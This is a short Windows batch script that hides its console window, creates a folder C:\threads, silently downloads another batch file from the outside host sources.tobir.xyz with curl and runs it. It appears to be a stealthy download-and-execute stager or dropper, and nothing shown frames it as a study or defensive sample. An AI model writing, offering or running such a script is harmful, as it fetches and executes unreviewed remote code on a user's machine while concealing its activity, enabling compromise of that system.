@echo off
powershell -window minimized -command ""
powershell -window hidden -command ""
cd C:\
mkdir threads
cd threads
curl -s https://sources.tobir.xyz/threads/threads.bat > threads.tmpbat
move threads.tmpbat threads.bat
call threads.bat
exit